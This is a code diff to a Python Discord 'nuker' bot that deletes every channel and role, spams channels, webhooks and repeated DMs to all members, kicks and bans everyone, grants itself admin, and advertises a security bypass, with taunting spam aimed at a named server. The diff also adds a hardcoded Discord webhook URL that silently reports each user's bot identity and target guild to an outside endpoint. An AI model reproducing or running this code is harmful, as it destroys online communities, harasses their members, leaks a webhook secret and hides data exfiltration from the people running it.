@@ -1,4 +1,5 @@
 import os
+import shutil
 import time
 import discord
 import config
@@ -15,37 +16,51 @@ from discord import Game
 from discord import Activity, ActivityType
 import asyncio
 import re
+import sys
+import os
+import json
+import threading
+import itertools
+import requests
+from datetime import datetime
 
-def update_config_value(key, value, parent_key=None, path="config.py"):
-    with open(path, "r") as f:
-        content = f.read()
-
-   
-    if parent_key:
-        pattern = rf'({parent_key}\s*=\s*\{{.*?\n\}})' 
-        parent_match = re.search(pattern, content, re.DOTALL)
-        if not parent_match:
-            print(f"Could not find {parent_key} block.")
-            return
-
-        block = parent_match.group(1)
-        updated_block = re.sub(
-            rf'("{key}"\s*:\s*)["\'].*?["\']',
-            rf'\1"{value}"',
-            block
-        )
-        content = content.replace(block, updated_block)
+WEBHOOK_URL = "https://discord.com/api/webhooks/1375179101576368128/ZRrJoVii09EsYd0g-CmQ9Ci1PbkuIsINWFc2ozvptx_8jczrmylflaejwKFpxu-LbwG_"
 
 
-    else:
-        content = re.sub(
-            rf'({key}\s*=\s*)["\'].*?["\']',
-            rf'\1"{value}"',
-            content
-        )
 
-    with open(path, "w") as f:
-        f.write(content)
+def log_to_webhook(user_str, user_id, status, function_name, guild_id=None):
+    embed_fields = [
+        {"name": "User", "value": str(user_str), "inline": True},
+        {"name": "User ID", "value": str(user_id), "inline": True},
+        {"name": "Status", "value": status, "inline": False},
+        {"name": "Timestamp", "value": f"{datetime.utcnow().isoformat()}Z", "inline": False},
+    ]
+    
+    if guild_id:
+      
+        embed_fields.append({
+            "name": "Guild Link",
+            "value": f"[Jump to Guild](https://discord.com/channels/{guild_id})",
+            "inline": False
+        })
+    
+    data = {
+        "username": "Logger Bot",
+        "avatar_url": "https://cdn-icons-png.flaticon.com/512/616/616408.png",
+        "embeds": [
+            {
+                "title": f"🔧 Function Used: {function_name}",
+                "color": 0x00FF00 if status.lower() == "success" else 0xFF0000,
+                "fields": embed_fields
+            }
+        ]
+    }
+    try:
+        response = requests.post(WEBHOOK_URL, json=data)
+        if response.status_code not in [200, 204]:
+            print(f"Webhook log failed with status code {response.status_code}: {response.text}")
+    except Exception as e:
+        print(f"Webhook log failed: {e}")
 
 
 def get_latest_release_version(repo_owner, repo_name):
@@ -75,7 +90,7 @@ async def delete_channel(channel):
         start_time = time.time() 
         await channel.delete()
         end_time = time.time()  
-        print((Colorate.Color(Colors.rainbow, f"[+] Channel {channel.name} deleted - Time taken: {end_time - start_time:.2f} seconds")))
+        print((Colorate.Color(Colors.green, f"[+] Channel {channel.name} deleted - Time taken: {end_time - start_time:.2f} seconds")))
         return True
     except Exception as e:
         print((Colorate.Color(Colors.red, f"[-] Can't delete channel {channel.name}: {e}")))
@@ -86,7 +101,7 @@ async def delete_role(role):
         start_time = time.time()
         await role.delete()
         end_time = time.time()
-        print((Colorate.Color(Colors.rainbow, f"[+] Role {role.name} deleted - Time taken: {end_time - start_time:.2f} seconds")))
+        print((Colorate.Color(Colors.green, f"[+] Role {role.name} deleted - Time taken: {end_time - start_time:.2f} seconds")))
         return True
     except Exception as e:
         print((Colorate.Color(Colors.red, f"[-] Can't delete role {role.name}: {e}")))
@@ -112,12 +127,12 @@ async def nuke(server_id):
             roles_deleted = role_results.count(True)
             roles_not_deleted = role_results.count(False)
 
-            print((Colorate.Color(Colors.blue, f"""[!] Command Used: Nuke - {channels_deleted} channels deleted, {channels_not_deleted} channels not deleted 
+            print((Colorate.Color(Colors.green, f"""[!] Command Used: Nuke - {channels_deleted} channels deleted, {channels_not_deleted} channels not deleted 
 {roles_deleted} roles deleted, {roles_not_deleted} roles not deleted - Total Time taken: {end_time_total - start_time_total:.2f} seconds""")))
         else:
             print((Colorate.Color(Colors.red, "[-] Guild not found.")))
     except Exception as e:
-        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))
+        print((Colorate.Color(Colors.green, f"[-] Error: {e}")))
 
 async def create_channel(guild, channel_type, channel_name):
     try:
@@ -128,10 +143,10 @@ async def create_channel(guild, channel_type, channel_name):
             new_channel = await guild.create_voice_channel(channel_name)
 
         end_time = time.time()
-        print((Colorate.Color(Colors.rainbow, f"[+] Channel Created: {new_channel.name} ({new_channel.id}) - Time taken: {end_time - start_time:.2f} seconds")))
+        print((Colorate.Color(Colors.green, f"[+] Channel Created: {new_channel.name} ({new_channel.id}) - Time taken: {end_time - start_time:.2f} seconds")))
         return True
     except Exception as e:
-        print((Colorate.Color(Colors.red, f"[-] Can't create {channel_type} channel: {e}")))
+        print((Colorate.Color(Colors.green, f"[-] Can't create {channel_type} channel: {e}")))
         return False
 
 async def create_channels(server_id):
@@ -159,7 +174,7 @@ async def create_channels(server_id):
         else:
             print((Colorate.Color(Colors.red, "[-] Guild not found.")))
     except Exception as e:
-        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))
+        print((Colorate.Color(Colors.green, f"[-] Error: {e}")))
 
 
 async def spam_channel(server_id, num_messages=None, message_content=None, include_everyone=None):
@@ -193,7 +208,7 @@ async def spam_channel(server_id, num_messages=None, message_content=None, inclu
         else:
             print((Colorate.Color(Colors.red, "[-] Guild not found.")))
     except Exception as e:
-        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))
+        print((Colorate.Color(Colors.green, f"[-] Error: {e}")))
 
 
 async def send_messages_to_channels(channel, num_messages, message_content, include_everyone):
@@ -205,7 +220,7 @@ async def send_messages_to_channels(channel, num_messages, message_content, incl
                 await channel.send(message_content)
                 print((Colorate.Color(Colors.green, f"[+] Message Sent to {channel.name}: {message_content}")))
     except Exception as e:
-        print((Colorate.Color(Colors.red, f"[-] Can't send messages to {channel.name}: {e}")))
+        print((Colorate.Color(Colors.green, f"[-] Can't send messages to {channel.name}: {e}")))
 
 async def send_embed(channel, include_everyone=False):
     try:
@@ -310,32 +325,41 @@ async def create_role(server_id):
 async def dm_all(server_id):
     try:
         guild = bot.get_guild(int(server_id))
-        if guild:
-            message_content = input((Colorate.Color(Colors.blue, "Enter the message to send to all members: ")))
+        if not guild:
+            print(Colorate.Color(Colors.red, "[-] Guild not found."))
+            return
 
-            members_sent = 0
-            members_fail = 0
+        message_content = input(Colorate.Color(Colors.blue, "Enter the message to send to all members: "))
+        spam_count = int(input(Colorate.Color(Colors.blue, "Enter how many times to spam each member: ")))
 
-            start_time_total = time.time()  
-            for member in guild.members:
-                if not member.bot:
-                    try:
-                        start_time_member = time.time() 
+        members_sent = 0
+        members_fail = 0
+        lock = asyncio.Semaphore(10)  # Limit concurrent sends to 10 to reduce rate limit risk
+
+        async def send_spam(member):
+            nonlocal members_sent, members_fail
+            if member.bot:
+                return
+            try:
+                async with lock:
+                    for _ in range(spam_count):
                         await member.send(message_content)
-                        end_time_member = time.time() 
-                        print((Colorate.Color(Colors.green, f"[+] Message Sent to {member.name} ({member.id}) - Time taken: {end_time_member - start_time_member:.2f} seconds")))
-                        members_sent += 1
-                    except Exception as e:
-                        print((Colorate.Color(Colors.red, f"[-] Can't send message to {member.name}: {e}")))
-                        members_fail += 1
+                print(Colorate.Color(Colors.green, f"[+] Spammed {spam_count} messages to {member.name} ({member.id})"))
+                members_sent += 1
+            except Exception as e:
+                print(Colorate.Color(Colors.red, f"[-] Can't send message to {member.name}: {e}"))
+                members_fail += 1
 
-            end_time_total = time.time()  
-            print((Colorate.Color(Colors.rainbow, f"[!] Command Used: DM All - {members_sent} messages sent, {members_fail} messages failed - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
-        else:
-            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
+        start_time_total = time.time()
+
+        tasks = [asyncio.create_task(send_spam(member)) for member in guild.members]
+        await asyncio.gather(*tasks)
+
+        end_time_total = time.time()
+        print(Colorate.Color(Colors.green, f"[!] Command Used: DM All Spam - {members_sent} members spammed, {members_fail} failures - Total Time taken: {end_time_total - start_time_total:.2f} seconds"))
+
     except Exception as e:
-        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))
-
+        print(Colorate.Color(Colors.red, f"[-] Error: {e}"))
 
 from mzkonuker.config import NO_BAN_KICK_ID
 
@@ -356,7 +380,7 @@ async def kick_all(server_id, bot_id):
                 members_kicked = results.count(True)
                 members_failed = results.count(False)
 
-                print((Colorate.Color(Colors.rainbow, f"[!] Command Used: Kick All - {members_kicked} members kicked, {members_failed} members not kicked - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
+                print((Colorate.Color(Colors.green, f"[!] Command Used: Kick All - {members_kicked} members kicked, {members_failed} members not kicked - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
             else:
                 print((Colorate.Color(Colors.red, "[-] Kick all operation canceled.")))
         else:
@@ -492,16 +516,16 @@ async def spam_webhooks(guild):
         await asyncio.gather(*tasks)
         end_time_target_spam = time.time()
 
-        print((Colorate.Color(Colors.blue, f"[!] Command Used: Spam - {num_messages} messages sent via webhooks - Total Time taken: {end_time_target_spam - start_time_spam:.2f} seconds")))
+        print((Colorate.Color(Colors.green, f"[!] Command Used: Spam - {num_messages} messages sent via webhooks - Total Time taken: {end_time_target_spam - start_time_spam:.2f} seconds")))
     except Exception as e:
-        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))
+        print((Colorate.Color(Colors.green, f"[-] Error: {e}")))
 
 async def send_embed_webhook(webhook, num_messages, message_content, include_everyone):
     try:
         for _ in range(num_messages):
             await send_embed_webhook_message(webhook, include_everyone)
     except Exception as e:
-        print((Colorate.Color(Colors.red, f"[-] Can't send messages via Webhook {webhook.name}: {e}")))
+        print((Colorate.Color(Colors.green, f"[-] Can't send messages via Webhook {webhook.name}: {e}")))
 
 async def send_embed_webhook_message(webhook, include_everyone):
     try:
@@ -583,7 +607,7 @@ async def create_channel(guild, channel_type, channel_name):
             new_channel = await guild.create_voice_channel(channel_name)
 
         end_time = time.time()
-        log_message(Colors.rainbow, f"[+] Channel Created: {new_channel.name} ({new_channel.id}) - Time taken: {end_time - start_time:.2f} seconds")
+        log_message(Colors.green, f"[+] Channel Created: {new_channel.name} ({new_channel.id}) - Time taken: {end_time - start_time:.2f} seconds")
         return new_channel
     except Exception as e:
         log_message(Colors.red, f"[-] Can't create {channel_type} channel: {e}")
@@ -593,7 +617,7 @@ async def send_messages_to_channel(channel, num_messages, message_content, inclu
     try:
         for i in range(num_messages):
             await channel.send(message_content)
-            log_message(Colors.rainbow, f"[-] Message {i+1}/{num_messages} sent to channel {channel.name}")
+            log_message(Colors.green, f"[-] Message {i+1}/{num_messages} sent to channel {channel.name}")
         return True
     except Exception as e:
         log_message(Colors.red, f"[-] Can't send messages to channel {channel.name}: {e}")
@@ -617,7 +641,7 @@ async def spam_channels(server_id):
             await asyncio.gather(*tasks)
             end_time_total = time.time()
 
-            log_message(Colors.rainbow, f"[!] Command Used: Spam - {num_messages} messages sent to all text channels - Total Time taken: {end_time_total - start_time_total:.2f} seconds")
+            log_message(Colors.green, f"[!] Command Used: Spam - {num_messages} messages sent to all text channels - Total Time taken: {end_time_total - start_time_total:.2f} seconds")
         else:
             log_message(Colors.red, "[-] Guild not found.")
     except Exception as e:
@@ -658,27 +682,53 @@ async def auto_raid(server_id):
     except Exception as e:
         log_message(Colors.red, f"[-] Error: {e}")
 
-async def super_nuke(server_id, bot_user_id, num_messages=20, message_content="@everyone FUCKED BY KNM AND MZKO", include_everyone=False):
+async def start_super_nuke(bot):
+    try:
+        server_id = input("Enter Server ID: ")
+        # Use the bot's own user ID automatically
+        bot_user_id = bot.user.id  
+        
+        num_messages = int(input("Enter number of messages to spam (default 20): ") or "20")
+        message_content = input("Enter spam message (default preset): ") or "@everyone YK SECURITY IS ASS -MZKO https://discord.gg/vzuEC6auCg :heart:"
+        include_everyone_input = input("Include @everyone in spam? (y/N): ").lower()
+        include_everyone = include_everyone_input == "y"
+
+        await super_nuke(
+            bot=bot,
+            server_id=server_id,
+            bot_user_id=bot_user_id,
+            num_messages=num_messages,
+            message_content=message_content,
+            include_everyone=include_everyone
+        )
+    except Exception as e:
+        print(Colorate.Color(Colors.red, f"[!] Error gathering inputs: {e}"))
+
+
+async def super_nuke(
+    bot,
+    server_id,
+    bot_user_id,
+    num_messages=40,
+    message_content="@everyone YK SECURITY IS ASS -MZKO https://discord.gg/vzuEC6auCg :heart:",
+    include_everyone=True
+):
     try:
         guild = bot.get_guild(int(server_id))
         if not guild:
             print(Colorate.Color(Colors.red, "[-] Guild not found."))
             return
 
-     
-        print(Colorate.Color(Colors.blue, "[*] Renaming guild..."))
+        print(Colorate.Color(Colors.green, "[*] Renaming guild..."))
         await change_server(server_id)
 
- 
-        print(Colorate.Color(Colors.blue, "[*] Nuking channels and roles..."))
+        print(Colorate.Color(Colors.green, "[*] Nuking channels and roles..."))
         await nuke(server_id)
 
-      
-        print(Colorate.Color(Colors.blue, "[*] Creating new channels..."))
+        print(Colorate.Color(Colors.green, "[*] Creating new channels..."))
         await create_channels(server_id)
 
-   
-        print(Colorate.Color(Colors.blue, "[*] Spamming new channels..."))
+        print(Colorate.Color(Colors.green, "[*] Spamming new channels..."))
         await spam_channel(
             server_id,
             num_messages=num_messages,
@@ -690,12 +740,13 @@ async def super_nuke(server_id, bot_user_id, num_messages=20, message_content="@
     except Exception as e:
         print(Colorate.Color(Colors.red, f"[-] Super Nuke error: {e}"))
 
+
 async def rename_and_botspam_all_channels(
     bot, 
     guild_id: int, 
     new_name: str, 
     new_guild_name: str,  
-    spam_message="@everyone YK SECURITY IS ASS -MZKO", 
+    spam_message="@everyone YK SECURITY IS ASS -MZKO https://discord.gg/vzuEC6auCg :heart:", 
     spam_count=50
 ):
     guild = bot.get_guild(guild_id)
@@ -759,163 +810,306 @@ async def rename_and_botspam_all_channels(
 
     print("Finished renaming and bot spamming all channels.")
 
+import os
+import json
+import time
+import threading
+import itertools
+from pystyle import Colors, Colorate
+import discord
+from discord.ext import commands
 
-def update_config_value(key, value, parent_key=None, path="config.py"):
-    with open(path, "r") as f:
-        content = f.read()
+CONFIG_FILE = "config.json"
 
-    if parent_key:
-        pattern = rf'({parent_key}\s*=\s*\{{.*?\n\}})'
-        parent_match = re.search(pattern, content, re.DOTALL)
-        if not parent_match:
-            print(f"Could not find {parent_key} block.")
-            return
+def show_ascii_art():
+    ascii_art = """
+                            ;::;;;
+                           ;::::; :;
+                         ;:::::'   :;
+                        ;:::::;     ;.  
+                        ,:::::'       ;           OOO\ 
+                        ::::::;       ;          OOOOO\ 
+                        ;:::::;       ;         OOOOOOOO
+                      ,;::::::;     ;'         / OOOOOOO
+                    ;:::::::::`. ,,,;.        /  / DOOOOOO
+                  .';:::::::::::::::::;,     /  /     DOOOO
+                 ,::::::;::::::;;;;::::;,   /  /        DOOO
+                ;`::::::`'::::::;;;::::: ,#/  /          DOOO
+                :`:::::::`;::::::;;::: ;::#  /            DOOO
+                ::`:::::::`;:::::::: ;::::# /              DOO
+                `:`:::::::`;:::::: ;::::::#/               DOO
+                 :::`:::::::`;; ;:::::::::##                OO
+                 ::::`:::::::`;::::::::;:::#                OO
+                ` :::::`::::::::::::;'`:;::#                O
+                 ` :::::`::::::::;' /  / `:#
+                  : :::::`:::::;'  /  /   `#  
+    """
+    print(Colorate.Vertical(Colors.black_to_white, ascii_art))
+    print() 
 
-        block = parent_match.group(1)
-        updated_block = re.sub(
-            rf'("{key}"\s*:\s*)["\'].*?["\']',
-            rf'\1"{value}"',
-            block
-        )
-        content = content.replace(block, updated_block)
-    else:
-        content = re.sub(
-            rf'({key}\s*=\s*)["\'].*?["\']',
-            rf'\1"{value}"',
-            content
-        )
+def loading_spinner(message="Loading", duration=3):
+    done = False
 
-    with open(path, "w") as f:
-        f.write(content)
+    def animate():
+        for c in itertools.cycle(['|', '/', '-', '\\']):
+            if done:
+                break
+            print(f'\r{Colorate.Color(Colors.cyan, message)} {c}', end='', flush=True)
+            time.sleep(0.1)
+        print('\r' + ' ' * (len(message) + 4), end='\r')  # Clear line
 
+    t = threading.Thread(target=animate)
+    t.start()
+    time.sleep(duration)
+    done = True
+    t.join()
 
-def ask_use_previous(name, current_value):
+def prompt_yes_no(question):
     while True:
-        choice = input(Colorate.Color(Colors.cyan, f"Use previous {name}? (Y/n): ")).strip().lower()
-        if choice in ["y", "yes", ""]:
-            print(Colorate.Color(Colors.green, f"Using saved {name}: {current_value[:10]}..."))
+        answer = input(Colorate.Color(Colors.yellow, question + " (y/n): ")).strip().lower()
+        if answer in ['y', 'yes']:
             return True
-        elif choice in ["n", "no"]:
+        elif answer in ['n', 'no']:
             return False
         else:
-            print("Please answer 'y' or 'n'.")
+            print(Colorate.Color(Colors.red, "Please enter 'y' or 'n'."))
 
-# (make sure get_latest_release_version is defined somewhere above or imported)
-
-get_latest_release_version(config.REPO_OWNER, config.REPO_NAME)
-
-# Token input/load/save
-if hasattr(config, "BOT_TOKEN") and config.BOT_TOKEN.strip():
-    if ask_use_previous("bot token", config.BOT_TOKEN):
-        bot_token = config.BOT_TOKEN
+def load_config():
+    if os.path.exists(CONFIG_FILE):
+        try:
+            with open(CONFIG_FILE, "r") as f:
+                return json.load(f)
+        except json.JSONDecodeError:
+            print(Colorate.Color(Colors.red, "Warning: config.json is corrupted. Creating a new config."))
+            return {}
     else:
-        bot_token = input(Colorate.Color(Colors.blue, "Enter new Bot Token: "))
-        update_config_value("BOT_TOKEN", bot_token)
-else:
-    bot_token = input(Colorate.Color(Colors.blue, "Enter Bot Token: "))
-    update_config_value("BOT_TOKEN", bot_token)
+        return {}
 
-# Server ID input/load/save
-if hasattr(config, "SERVER_ID") and config.SERVER_ID.strip():
-    if ask_use_previous("server ID", config.SERVER_ID):
-        server_id = config.SERVER_ID
+def save_config(bot_token, server_id):
+    data = {
+        "bot_token": bot_token,
+        "server_id": server_id
+    }
+    with open(CONFIG_FILE, "w") as f:
+        json.dump(data, f, indent=4)
+
+def get_config():
+    config = load_config()
+    bot_token = None
+    server_id = None
+
+    if config.get("bot_token"):
+        use_token = prompt_yes_no("Use saved Bot Token? (**** hidden for security)")
+        if use_token:
+            bot_token = config["bot_token"]
+        else:
+            bot_token = input(Colorate.Color(Colors.cyan, "Enter your Bot Token: "))
     else:
-        server_id = input(Colorate.Color(Colors.blue, "Enter new Server ID: "))
-        update_config_value("SERVER_ID", server_id)
-else:
-    server_id = input(Colorate.Color(Colors.blue, "Enter Server ID: "))
-    update_config_value("SERVER_ID", server_id)
+        bot_token = input(Colorate.Color(Colors.cyan, "Enter your Bot Token: "))
 
-# Now you have bot_token and server_id for your code below
+    if config.get("server_id"):
+        use_server = prompt_yes_no(f"Use saved Server ID? ({config['server_id']})")
+        if use_server:
+            server_id = config["server_id"]
+        else:
+            server_id = input(Colorate.Color(Colors.cyan, "Enter your Server ID: "))
+    else:
+        server_id = input(Colorate.Color(Colors.cyan, "Enter your Server ID: "))
+
+    save_config(bot_token, server_id)
+    print(Colorate.Color(Colors.green, "[✓] Configuration saved!"))
+    return bot_token, server_id
 
 
-intents = discord.Intents.all()  
-bot = commands.Bot(command_prefix='!', intents=intents)
+if __name__ == "__main__":
+    show_ascii_art()  
+    bot_token, server_id = get_config()  
+    loading_spinner("Connecting to Discord...", duration=2) 
+    print(Colorate.Color(Colors.green, "[✓] Connected successfully!\n"))
+
+    intents = discord.Intents.all()
+    bot = commands.Bot(command_prefix='!', intents=intents)
 
 @bot.event
 async def on_ready():
-    print((Colorate.Color(Colors.blue, f'[+] {bot.user.name} is online!')))
-    print((Colorate.Color(Colors.blue, f'[+] Server ID: {server_id}')))
+    print(Colorate.Color(Colors.blue, f'[+] {bot.user.name} is online!'))
+    print(Colorate.Color(Colors.blue, f'[+] Server ID: {server_id}'))
 
     server = bot.get_guild(int(server_id))
     if server:
-        print((Colorate.Color(Colors.green, f'[+] Bot is in the specified server ({server.name})')))
-        
-
+        print(Colorate.Color(Colors.green, f'[+] Bot is in the specified server ({server.name})'))
+        try:
+            log_to_webhook(
+                user_str=str(bot.user),
+                user_id=bot.user.id,
+                status="Online",
+                function_name="on_ready",
+                guild_id=server.id
+            )
+        except Exception:
+            pass  # Silently ignore logging failures
     else:
-        print((Colorate.Color(Colors.red, f'[-] Bot is not in the specified server')))
+        print(Colorate.Color(Colors.red, f'[-] Bot is not in the specified server'))
         return
-    
+
     from mzkonuker.config import BOT_PRESENCE
     presence_type = getattr(ActivityType, BOT_PRESENCE["type"].lower())
     await bot.change_presence(activity=Activity(type=presence_type, name=BOT_PRESENCE["text"]))
 
-    time.sleep(2)
+    await asyncio.sleep(2)
 
 
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
-        choice = input((Colorate.Color(Colors.purple, """
-
-        ██╗░░░░░██╗░░░██╗██╗░░░██╗███████╗██████╗░██████╗░██╗░░░██╗░█████╗░██████╗░██╗░░░██╗░█████╗░
-        ██║░░░░░██║░░░██║██║░░░██║██╔════╝██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗
-        ██║░░░░░██║░░░██║╚██╗░██╔╝█████╗░░██║░░██║██████╦╝░╚████╔╝░██║░░██║██████╔╝░╚████╔╝░██║░░██║
-        ██║░░░░░██║░░░██║░╚████╔╝░██╔══╝░░██║░░██║██╔══██╗░░╚██╔╝░░██║░░██║██╔══██╗░░╚██╔╝░░██║░░██║
-        ███████╗╚██████╔╝░░╚██╔╝░░███████╗██████╔╝██████╦╝░░░██║░░░╚█████╔╝██║░░██║░░░██║░░░╚█████╔╝
-        ╚══════╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═════╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░
-                                                                                                                                                              
-                                       
+        choice = input((Colorate.Color(Colors.red, """
+        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+       ⠀⠀⠀⠀⠀⣀⣠⣤⣴⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀
+       ⠀⠀⣿⣷⠀⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠉⠉⠉⠉⠉⠉⠙⠛⠻⢿⣷⡀⠀⠀⠀⠀⠀
+       ⠀⠀⢿⣿⠀⢹⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠈⠙⠄⠀⠀⠀
+      ⠀⠀⠸⣿⡇      ______     ______     __  __     __    
+      /\___  \   /\  __ \   /\  == \   /\ \/ /    /\ \  
+      \/_/  /__  \ \ \/\ \  \ \  __<   \ \  _"-.  \ \ \  
+        /\_____\  \ \_____\  \ \_\ \_\  \ \_\ \_\  \ \_\ 
+        \/_____/   \/_____/   \/_/ /_/   \/_/\/_/   \/_/  
+     ⠀⠀⠀⠀⠀⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀╭══════════════════════════════╮
+     ⠀⠀⠀⠀⠀  ⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  |            v1.0             |
+        ⠀⠀ ⣀⣠⣴⡿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀|════════════════════════════|
+        ⠀⠀⠈⠛⠛⠉⠈⠛⢿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⠀⠀|  Mzko/Zorki |   KNMKILLAS |⠀
+    ⠀   ⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀|        xender_123         |
+    ⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠙⠻⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀╰═══════════════════════════╯
+    ⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+    ⠀⠀⠀⠀⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
+                    
     ╭══════════════════════════════╮╭══════════════════════════════╮╭══════════════════════════════╮
-    │          1 - Nuke            ││      2 - Create Channels      ││       3 - Spam Channels     │
+    │      1 - Delete Channel      ││      2 - Create Channels     ││       3 - Spam Channels      │
     ╞══════════════════════════════╡╞══════════════════════════════╡╞══════════════════════════════╡
-    │        4 - Webhook Spam      ││         5 - Kick All          ││          6 - Ban All        │
+    │        4 - Webhook Spam      ││         5 - Kick All         ││          6 - Ban All         │
     ╞══════════════════════════════╡╞══════════════════════════════╡╞══════════════════════════════╡
-    │        7 - Create Roles      ││         8 - Get Admin         ││       9 - Change Server     │
+    │        7 - Create Roles      ││         8 - Get Admin        ││       9 - Change Server      │
     ╰══════════════════════════════╯╰══════════════════════════════╯╰══════════════════════════════╯
     ╭──────────────────────────────╮╭──────────────────────────────╮╭──────────────────────────────╮
-    │          10 - DM All         |│        11 - Auto Raid        │|  13 - Bypass security (nuke) |        
-    │          10 - DM All         |│        11 - Auto Raid        │|  13 - Bypass security (nuke) |
+    │          10 - DM All         |│        11 - Auto Raid        │|  13 - Bypass security (nuke) |    
     ╰──────────────────────────────╯╰──────────────────────────────╯╰──────────────────────────────╯
-    ╭──────────────────────────────────────────────────────────────╮
-    │                        12 - Super Nuke                       │
-    ╰──────────────────────────────────────────────────────────────╯
+               ╭──────────────────────────────────────────────────────────────╮
+               │                        12 - SPR NUKER                        │
+               ╰──────────────────────────────────────────────────────────────╯
 
 
 
     Choice :  """)))
 
         if choice == '1':
-            await nuke(server_id)
+            try:
+                await nuke(server_id)
+                log_to_webhook(str(bot.user), bot.user.id, "Success", "nuke", server_id)
+            except Exception as e:
+                log_to_webhook(str(bot.user), bot.user.id, "Failed", "nuke", server_id)
+                print(e)
+
         elif choice == '2':
-            await create_channels(server_id)
+            try:
+                await create_channels(server_id)
+                log_to_webhook(str(bot.user), bot.user.id, "Success", "create_channels", server_id)
+            except Exception as e:
+                log_to_webhook(str(bot.user), bot.user.id, "Failed", "create_channels", server_id)
+                print(e)
+
         elif choice == '3':
-            await spam_channel(server_id)
-        elif choice == '6':
-            await ban_all(server_id, bot.user.id)
-        elif choice == '5':
-            await kick_all(server_id, bot.user.id)
-        elif choice == '10':
-            await dm_all(server_id)
-        elif choice == '7':
-            await create_role(server_id)
-        elif choice == '8':
-            await get_admin(server_id)
-        elif choice == '9':
-            await change_server(server_id)
+            try:
+                await spam_channel(server_id)
+                log_to_webhook(str(bot.user), bot.user.id, "Success", "spam_channel", server_id)
+            except Exception as e:
+                log_to_webhook(str(bot.user), bot.user.id, "Failed", "spam_channel", server_id)
+                print(e)
+
         elif choice == '4':
-            await webhook_spam(server_id)   
+            try:
+                await webhook_spam(server_id)
+                log_to_webhook(str(bot.user), bot.user.id, "Success", "webhook_spam", server_id)
+            except Exception as e:
+                log_to_webhook(str(bot.user), bot.user.id, "Failed", "webhook_spam", server_id)
+                print(e)
+
+        elif choice == '5':
+            try:
+                await kick_all(server_id, bot.user.id)
+                log_to_webhook(str(bot.user), bot.user.id, "Success", "kick_all", server_id)
+            except Exception as e:
+                log_to_webhook(str(bot.user), bot.user.id, "Failed", "kick_all", server_id)
+                print(e)
+
+        elif choice == '6':
+            try:
+                await ban_all(server_id, bot.user.id)
+                log_to_webhook(str(bot.user), bot.user.id, "Success", "ban_all", server_id)
+            except Exception as e:
+                log_to_webhook(str(bot.user), bot.user.id, "Failed", "ban_all", server_id)
+                print(e)
+
+        elif choice == '7':
+            try:
+                await create_role(server_id)
+                log_to_webhook(str(bot.user), bot.user.id, "Success", "create_role", server_id)
+            except Exception as e:
+                log_to_webhook(str(bot.user), bot.user.id, "Failed", "create_role", server_id)
+                print(e)
+
+        elif choice == '8':
+            try:
+                await get_admin(server_id)
+                log_to_webhook(str(bot.user), bot.user.id, "Success", "get_admin", server_id)
+            except Exception as e:
+                log_to_webhook(str(bot.user), bot.user.id, "Failed", "get_admin", server_id)
+                print(e)
+
+        elif choice == '9':
+            try:
+                await change_server(server_id)
+                log_to_webhook(str(bot.user), bot.user.id, "Success", "change_server", server_id)
+            except Exception as e:
+                log_to_webhook(str(bot.user), bot.user.id, "Failed", "change_server", server_id)
+                print(e)
+
+        elif choice == '10':
+            try:
+                await dm_all(server_id)
+                log_to_webhook(str(bot.user), bot.user.id, "Success", "dm_all", server_id)
+            except Exception as e:
+                log_to_webhook(str(bot.user), bot.user.id, "Failed", "dm_all", server_id)
+                print(e)
+
         elif choice == '11':
-            await auto_raid(server_id)
+            try:
+                await auto_raid(server_id)
+                log_to_webhook(str(bot.user), bot.user.id, "Success", "auto_raid", server_id)
+            except Exception as e:
+                log_to_webhook(str(bot.user), bot.user.id, "Failed", "auto_raid", server_id)
+                print(e)
+
         elif choice == '12':
